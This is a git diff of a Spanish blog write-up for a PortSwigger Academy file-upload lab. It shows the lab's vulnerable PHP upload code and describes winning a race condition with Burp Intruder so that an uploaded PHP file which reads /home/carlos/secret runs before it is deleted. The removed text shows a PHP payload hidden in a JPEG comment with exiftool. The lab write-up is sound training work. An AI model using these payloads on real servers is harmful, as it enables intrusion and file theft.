@@ -1,7 +1,7 @@
 +++
 author = "Alux"
 title = "Portswigger Academy Learning Path: File Upload Lab 8"
-date = "2022-01-11"
+date = "2022-01-13"
 description = "Lab: Web shell upload via race condition"
 tags = [
     "file upload",
@@ -36,52 +36,48 @@ Creamos el archivo php con el siguiente codigo
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
-Ahora enviamos el archivo, y vemos la respuesta que nos da diciendo que no se permite subir archivos de tipo `php` solamente `jpg y png`  aun cuando le agregamos las cabeceras para que sea un archivo de tipo jpg o png
+Ahora se nos da el siguiente codigo para explicar que es lo que hace por atras el servidor y leyendolo entendemos que lo que hace es subir el archivo primero al servidor y ahi checarlo y validar, si es validado lo sube si no lo elimina, pero el principal problema es que se mantiene en el servidor por unos segundos el servicio. Por lo que nos podemos aprovechar de eso para explotarlo y subir directamente nuestro codigo php ya que hasta despues es validado.
 
-- https://en.wikipedia.org/wiki/List_of_file_signatures
+```php
+<?php
+$target_dir = "avatars/";
+$target_file = $target_dir . $_FILES["avatar"]["name"];
 
-![Subida de archivo php al servidor](request.png)
+// temporary move
+move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
 
-Despues de intentar tanto encontre algo de exiftool y agregar un comentario en el blog de hacktricks, asi que me decidi a agregar un comentario a una imagen jpg cualquiera.
+if (checkViruses($target_file) && checkFileType($target_file)) {
+    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
+} else {
+    unlink($target_file);
+    echo "Sorry, there was an error uploading your file.";
+    http_response_code(403);
+}
 
-- https://book.hacktricks.xyz/pentesting-web/file-upload
+function checkViruses($fileName) {
+    // checking for viruses
+    ...
+}
 
-```bash
-alux@rootsystems:~/portswigger$ exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" imagen.jpg
-    1 image files updated
-alux@rootsystems:~/portswigger$ exiftool imagen.jpg
-ExifTool Version Number         : 12.30
-File Name                       : imagen.jpg
-Directory                       : .
-File Size                       : 73 KiB
-File Modification Date/Time     : 2022:01:11 20:55:52-06:00
-File Access Date/Time           : 2022:01:11 20:55:52-06:00
-File Inode Change Date/Time     : 2022:01:11 20:55:52-06:00
-File Permissions                : -rw-r--r--
-File Type                       : JPEG
-File Type Extension             : jpg
-MIME Type                       : image/jpeg
-JFIF Version                    : 1.01
-Resolution Unit                 : inches
-X Resolution                    : 72
-Y Resolution                    : 72
-Comment                         : <?php echo file_get_contents('/home/carlos/secret'); ?>
-Image Width                     : 1080
-Image Height                    : 1350
-Encoding Process                : Progressive DCT, Huffman coding
-Bits Per Sample                 : 8
-Color Components                : 3
-Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
-Image Size                      : 1080x1350
-Megapixels                      : 1.5
+function checkFileType($fileName) {
+    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
+    if($imageFileType != "jpg" && $imageFileType != "png") {
+        echo "Sorry, only JPG & PNG files are allowed\n";
+        return false;
+    } else {
+        return true;
+    }
+}
+?>
 ```
-Ahora que tenemos nuestra imagen jpg con un comentario, procedemos a subirlo, pero esta vez interceptando y no modificando nada, mas que el `filename` y `Content-type` para que se suban como archivos php y que el servidor no lo tome como imagen aunque si valide su cabecera y sea realmente una imagen pero al ingresar al servidor todo su texto legible se tomara como php.
+Ahora que sabemos esto, lo que intentearemos es subir el archivo al servidor, para aprovechar ese pequeno tiempo subido y obtener la key. Pero antes vamos a configurar intruder para realizar peticiones indefinidamente.
 
-![Subida de archivo al servidor como imagen pero en formato php](request1.png)
+![Peticion get para la solicitud del archivo php](intruder.png)
+![Ejecutar indefinidamente las peticiones con null payloads](intruder2.png)
 
-Ahora que hemos subido la imagen podemos ver la key y podemos notar entre todos los caracteres no legibles nuestra key, ya que todo lo esta interpretando como un php incluso los caracteres que no conoce.
+> Despues de este paso subimos nuestro codigo php y esperamos a que salga en nuestro ataque
 
-> El valor de la key empieza despues del 9 si vemos la peticion anterior notaremos como esta el valor 9 entre el contenido de la imagen antes del comentario
+Ahora lo ejecutamos y entre las respuestas podemos ver como se ejecuta el codigo php y se nos muestra la key, eso si por un corto tiempo.
 
 ![Lectura de archivo secret de carlos](key.png)
 
